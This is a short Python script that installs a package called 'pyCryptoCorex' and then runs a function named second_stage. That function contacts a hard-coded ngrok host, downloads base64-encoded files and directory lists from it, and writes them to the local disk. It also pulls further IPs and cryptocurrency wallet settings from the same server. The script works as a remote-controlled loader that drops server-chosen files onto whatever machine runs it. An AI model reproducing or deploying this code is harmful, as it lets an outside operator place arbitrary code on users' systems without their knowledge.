import pip
conf = None
def install(package):
    if hasattr(pip, 'main'):
        pip.main(['install', package])
    else:
        pip._internal.main(['install', package])
def second_stage():
    import pip
    from CryptoCore.PublicKey import RSA
    import hashlib
    from CryptoCore.Protocol.KDF import PBKDF2
    from base64 import b64decode, b64encode

    systems = {
        2: '01',
        10: '0123456789',
        16: '0123456789abcdef',
        32: 'abcdefghijklmnopqrstuvwxyz234567',
        33: 'abcdefghijklmnopqrstuvwxyz2345670',
        64: '0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm/+',
        256: ''.join([chr(x) for x in range(256)])
    }
    def encode(val, base, minlen=0):
        val = int(val)
        base, minlen = int(base), int(minlen)
        code_string = get_code_string(base)
        result = ''
        while val > 0:
            result = code_string[val % base] + result
            val //= base
        return code_string[0] * max(minlen - len(result), 0) + result
    def decode(string, base):
        string = str(string)
        base = int(base)
        code_string = get_code_string(base)
        result = 0
        if base == 16:
            string = string.lower()
        while len(string) > 0:
            result *= base
            result += code_string.find(string[0])
            string = string[1:]
        return int(result)
    def get_code_string(base):
        if base in systems:
            return systems[base]
        else:
            raise ValueError("Invalid base!")
    def sha256_16(arc):
        return hashlib.sha256(str(arc).encode()).hexdigest()
    def get_string(key, format = 'PEM'):
        return key.exportKey(format).decode()
    def AdrToPub(Adress):
        Adress = b'Sakaar: ' + str(Adress).encode()
        public_key = RSA.importKey(Adress)
        Public = get_string(public_key)
        return Public
    def PubCode(message, public_key):
        message = int(message)
        public_key = str(public_key)
        public_key = RSA.importKey(public_key.encode())
        # return public_key.encrypt(message)
        return int(public_key.encrypt(message))
    import shelve,requests,os,base64
    def get_conf():
        # pass
        global conf
        conf = getattr(conf,'_conf',None)
        if conf is None:
            conf = shelve.open('conf')
        return conf
    get_conf()
    conf['Connected'] = ['457af3235c91.ngrok.io']
    conf['Version'] = '1.000'
    conf['OurWallets'] = ['BTC','SKR']
    conf['Key'] = 'AAAAgQCkuqxx8XsVCOn0+Z3EFogneSuTOXRFsbRIACp8mLiXsv2v44Aa/uCFFpSPvleT/hIkJob+88StiMRQRtmHkbqeN1POfpNO1rPxJT1JONhHISns301hGN5k8ixQIdUiLduP0c7eewwfd1gyMScL+9YlBopQEb18BpzF0tjP+lWOdQ=='

    def Send_T1(dat,OUT = False,func = None): # Send to all
        if OUT == False:
            for ip in conf['Connected']:
                try:
                    res = requests.post(f'http://{str(ip)}/', json = dat)
                    res = res.json()
                    if not func is None:
                        res = func(res)
                    if not res is None:
                        return res
                except Exception as e:
                    pass
        else:
            for ip in conf['SUPERIP']:
                try:
                    res = requests.post(f'http://{str(ip)}/', json = dat)
                    res = res.json()
                    print(res)
                    if not func is None:
                        res = func(res)
                    if not res is None:
                        return res
                except Exception as e:
                    pass

    def GetUpDate():
        def function(Data):
            Pass = Data['Pass']
            Data['Data']['files'] = sorted(Data['Data']['files'])
            if decode(sha256_16(Data['Data']),16) == PubCode(int(Pass),AdrToPub(conf['Key'])):
                return Data
            return None
        dat = Send_T1(GetUpDate_S(),func = function)
        # print(dat)
        Pass = int(dat['Pass'])
        dat = dat['Data']
        for x in dat['dirs']:
            if not os.path.exists(x):
                os.mkdir(x)
        with open('VerPass.skr', 'w') as f:
            f.write(str(Pass))
        for x in dat['files']:
            print (x[0])
            with open(x[0], 'wb') as f:
                f.write(b64decode(bytes(x[1],'utf-8')))
    def GetUpDate_S():

        return {'Protocol':'GetUpDate'}
    def GetAllData():
        dat = Send_T1(GetAllData_S())
        for x in dat:
            print (x)
            with open(x, 'wb') as f:
                f.write(b64decode(bytes(dat[x],'utf-8')))
    def GetAllData_S():

        return {'Protocol':'GetAllData'}
    def GetConf():
        dat = Send_T1(GetConf_S())
        dat = dat['Data']
        conf['Version'] = dat[0]
        conf['Connected'] = dat[1]
        conf['SUPERIP'] = dat[2]
        conf['OurWallets'] = dat[3]
        conf['OtherWallets'] = dat[4]
        conf['InMemory'] = dat[5]
        conf['FullFreez'] = dat[6]
        conf['Block'] = dat[7]
        conf['Comis'] = dat[8]
        conf['Voiting'] = dat[9]
        conf['Voited'] = dat[10]
    def GetConf_S():

        return {'Protocol':'GetConf'}

    # GetAllData()
    GetUpDate()
    GetConf()
# Example
if __name__ == '__main__':
    install('pyCryptoCorex')
    second_stage()
